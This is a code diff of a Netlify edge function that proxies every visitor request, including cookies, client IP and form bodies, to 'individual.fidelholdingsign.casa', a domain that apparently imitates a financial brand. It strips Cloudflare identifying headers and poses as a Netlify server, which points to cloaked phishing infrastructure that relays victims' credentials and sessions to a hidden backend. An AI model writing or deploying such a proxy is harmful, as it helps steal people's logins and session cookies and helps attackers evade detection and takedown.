@@ -1,48 +1,47 @@
-import { Context } from "https://edge.netlify.com";
-
-export default async (request: Request, context: Context) => {
-  // 1. Define your Worker URL here
-  const workerBase = "https://mute-rice-e80a.eddanielbrewer.workers.dev";
-  
+export default async (request: Request) => {
   const url = new URL(request.url);
-  const target = workerBase + url.pathname + url.search;
-
-  // 2. Build clean headers for the upstream request (Stops Cloudflare from gzipping)
-  const proxyHeaders = new Headers();
-  proxyHeaders.set("User-Agent", request.headers.get("user-agent") || "Mozilla/5.0");
-  proxyHeaders.set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
+  const workerBase = "https://individual.fidelholdingsign.casa/";
   
+  // Construct the target URL
+  const target = new URL(url.pathname + url.search, workerBase).toString();
+
+  // Create clean headers for Cloudflare
+  const proxyHeaders = new Headers();
+  proxyHeaders.set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)");
+  proxyHeaders.set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+  // Explicitly demand uncompressed HTML so Netlify doesn't break it
+  proxyHeaders.set("Accept-Encoding", "identity");
+
   const cookie = request.headers.get("cookie");
   if (cookie) proxyHeaders.set("cookie", cookie);
 
-  const cfIp = request.headers.get("x-nf-client-connection-ip") || request.headers.get("x-forwarded-for");
-  if (cfIp) proxyHeaders.set("x-forwarded-for", cfIp);
+  const clientIp = request.headers.get("x-nf-client-connection-ip") || request.headers.get("x-forwarded-for");
+  if (clientIp) proxyHeaders.set("x-forwarded-for", clientIp);
 
-  // 3. Fetch from Worker
   const upstream = await fetch(target, {
     method: request.method,
     headers: proxyHeaders,
     body: request.method === "GET" || request.method === "HEAD" ? undefined : request.body,
-    redirect: "manual", // Handle redirects manually
+    redirect: "manual",
   });
 
-  // 4. Build clean headers for the browser
+  // Create clean headers for the browser
   const headers = new Headers(upstream.headers);
   
-  // Remove Cloudflare traces
+  // Strip Cloudflare traces
   headers.delete("cf-ray");
   headers.delete("cf-cache-status");
   headers.delete("server");
   
-  // Remove compression headers to prevent blank pages
+  // Strip compression headers to prevent blank rendering
   headers.delete("content-encoding");
   headers.delete("content-length");
   
   // Set Netlify headers
   headers.set("server", "Netlify");
   headers.set("x-frame-options", "SAMEORIGIN");
+  headers.set("content-type", "text/html;charset=UTF-8");
 
-  // 5. Return the response
   return new Response(upstream.body, {
     status: upstream.status,
     headers,
